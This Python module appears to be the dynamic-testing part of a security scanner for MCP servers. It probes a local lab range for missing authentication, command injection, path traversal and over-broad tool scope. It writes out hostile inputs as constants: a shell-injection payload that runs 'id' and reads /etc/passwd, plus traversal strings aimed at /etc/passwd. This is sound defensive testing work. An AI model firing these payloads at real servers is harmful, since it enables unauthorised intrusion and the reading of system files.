"""
Dynamic tester (Day 10)
===========================
Where the static scanner (Day 9) reads what a server CLAIMS about itself,
this module actually calls the server's tools and checks what happens —
the same crafted payloads as the Phase 2 exploit scripts, but driven
generically off each tool's advertised input schema rather than hardcoded
to our 4 range servers. That matters because a real scanner has to work
against MCP servers it has never seen before — it can't hardcode "the
vulnerable param on server4 is called filter".

Probes implemented:
  - DYN-AUTH-001   : does a tool call succeed with NO Authorization header?
  - DYN-EXEC-001   : does a shell-metacharacter payload in a string param
                      produce OS command output (uid=, /etc/passwd lines)?
  - DYN-FS-001     : does a traversal/absolute-path payload in a
                      path-or-file-named param return content outside the
                      declared sandbox?
  - DYN-SCOPE-001  : does supplying an UNDOCUMENTED optional param, with a
                      bogus required-ID, still return data a correct
                      single-record lookup should have rejected? (the
                      over-permissioned-tool signature)

Run:
    python3 -m scanner.dynamic_tester                 # test every range server
    python3 -m scanner.dynamic_tester --json
"""

from __future__ import annotations

import json
import os
import sys
from dataclasses import dataclass, asdict

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from client.harness import MCPClient, RANGE_SERVERS  # noqa: E402

CMD_INJECTION_PAYLOAD = "' ; id ; cat /etc/passwd | head -3 ; echo '"
CMD_INJECTION_MARKERS = ("uid=", "root:x:0:0")

TRAVERSAL_PAYLOADS = ["../" * 12 + "etc/passwd", "/etc/passwd"]
TRAVERSAL_MARKER = "root:x:0:0"

SCOPE_PROBE_VALUE = "1=1"


@dataclass
class DynFinding:
    server_name: str
    port: int
    rule_id: str
    title: str
    severity: str
    tool_name: str | None
    detail: str
    evidence: str


def _first_param(schema: dict, prefer: list[str] | None = None) -> str | None:
    props = list(schema.get("properties", {}).keys())
    if not props:
        return None
    if prefer:
        for p in props:
            if any(h in p.lower() for h in prefer):
                return p
    required = schema.get("required", [])
    return required[0] if required else props[0]


def probe_missing_auth(client: MCPClient, server_name: str, port: int,
                        tools: list[dict]) -> list[DynFinding]:
    if not tools:
        return []
    tool = tools[0]
    args = {p: "probe" for p in tool.get("inputSchema", {}).get("required", [])}
    try:
        result = client.call_tool(tool["name"], **args)
        if not result.startswith("[TOOL ERROR]") and "Unauthorized" not in result:
            return [DynFinding(
                server_name=server_name, port=port, rule_id="DYN-AUTH-001",
                title="Tool call succeeded with no Authorization header",
                severity="Critical", tool_name=tool["name"],
                detail="Called the server's own tool with zero auth and got a normal "
                       "(non-401) response — confirms missing/weak authentication live, "
                       "not just as a manifest claim.",
                evidence=result[:150],
            )]
    except Exception:  # noqa: BLE001
        pass
    return []


def probe_cmd_injection(client: MCPClient, server_name: str, port: int,
                         tool: dict) -> list[DynFinding]:
    schema = tool.get("inputSchema", {})
    param = _first_param(schema)
    if not param:
        return []
    args = {p: "" for p in schema.get("required", [])}
    args[param] = CMD_INJECTION_PAYLOAD
    try:
        result = client.call_tool(tool["name"], **args)
    except Exception:  # noqa: BLE001
        return []
    if any(marker in result for marker in CMD_INJECTION_MARKERS):
        return [DynFinding(
            server_name=server_name, port=port, rule_id="DYN-EXEC-001",
            title="OS command injection confirmed live",
            severity="Critical", tool_name=tool["name"],
            detail=f"Shell metacharacter payload in '{param}' produced OS command output.",
            evidence=result[:200],
        )]
    return []


def probe_path_traversal(client: MCPClient, server_name: str, port: int,
                          tool: dict) -> list[DynFinding]:
    schema = tool.get("inputSchema", {})
    param = _first_param(schema, prefer=["path", "file"])
    if not param or not any(h in param.lower() for h in ("path", "file")):
        return []
    for payload in TRAVERSAL_PAYLOADS:
        args = {p: "" for p in schema.get("required", [])}
        args[param] = payload
        try:
            result = client.call_tool(tool["name"], **args)
        except Exception:  # noqa: BLE001
            continue
        if TRAVERSAL_MARKER in result or (
            not result.startswith("[TOOL ERROR]") and payload.startswith("/") and len(result.strip()) > 0
        ):
            return [DynFinding(
                server_name=server_name, port=port, rule_id="DYN-FS-001",
                title="Path traversal / sandbox escape confirmed live",
                severity="High", tool_name=tool["name"],
                detail=f"'{param}'={payload!r} returned content from outside the declared sandbox.",
                evidence=result[:200],
            )]
    return []


def probe_over_permissioned(client: MCPClient, server_name: str, port: int,
                             tool: dict) -> list[DynFinding]:
    schema = tool.get("inputSchema", {})
    required = schema.get("required", [])
    optional = [p for p in schema.get("properties", {}) if p not in required]
    if len(required) != 1 or not optional:
        return []
    req_param = required[0]
    bogus_args = {req_param: "__nonexistent_probe_id__"}
    try:
        baseline = client.call_tool(tool["name"], **bogus_args)
    except Exception:  # noqa: BLE001
        return []
    for opt in optional:
        probe_args = dict(bogus_args)
        probe_args[opt] = SCOPE_PROBE_VALUE
        try:
            probed = client.call_tool(tool["name"], **probe_args)
        except Exception:  # noqa: BLE001
            continue
        baseline_empty = len(baseline.strip()) < 40 or "no " in baseline.lower()[:20]
        probed_substantial = len(probed.strip()) > max(80, len(baseline.strip()) * 2)
        if baseline_empty and probed_substantial:
            return [DynFinding(
                server_name=server_name, port=port, rule_id="DYN-SCOPE-001",
                title="Undocumented parameter widens tool scope past a single-record lookup",
                severity="High", tool_name=tool["name"],
                detail=f"With a bogus '{req_param}', adding '{opt}={SCOPE_PROBE_VALUE}' turned an "
                       f"empty/no-match result into a multi-record response — the tool accepts "
                       f"query logic beyond its documented single-ID scope.",
                evidence=probed[:200],
            )]
    return []


def test_server(server_name: str, port: int) -> list[DynFinding]:
    client = MCPClient(f"http://127.0.0.1:{port}")
    findings: list[DynFinding] = []
    try:
        client.initialize()
        tools = client.list_tools()
    except Exception as e:  # noqa: BLE001
        return [DynFinding(
            server_name=server_name, port=port, rule_id="DYN-000",
            title="Server unreachable", severity="Low", tool_name=None,
            detail=str(e), evidence="",
        )]

    findings += probe_missing_auth(client, server_name, port, tools)
    for tool in tools:
        findings += probe_cmd_injection(client, server_name, port, tool)
        findings += probe_path_traversal(client, server_name, port, tool)
        findings += probe_over_permissioned(client, server_name, port, tool)
    return findings


def test_range() -> list[DynFinding]:
    all_findings = []
    for port, label in RANGE_SERVERS.items():
        server_name = label.split(" (")[0]
        all_findings += test_server(server_name, port)
    return all_findings


def _print_human(findings: list[DynFinding]):
    by_server: dict[str, list[DynFinding]] = {}
    for f in findings:
        by_server.setdefault(f.server_name, []).append(f)
    sev_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}
    for server, items in by_server.items():
        print(f"\n=== {server} ===")
        for f in sorted(items, key=lambda f: sev_order.get(f.severity, 9)):
            tool = f" [{f.tool_name}]" if f.tool_name else ""
            print(f"  [{f.severity:<8}] {f.rule_id}{tool} — {f.title}")
            print(f"             {f.detail}")
    print(f"\nTotal live-confirmed findings: {len(findings)} across {len(by_server)} server(s)")


if __name__ == "__main__":
    findings = test_range()
    if "--json" in sys.argv:
        print(json.dumps([asdict(f) for f in findings], indent=2))
    else:
        _print_human(findings)
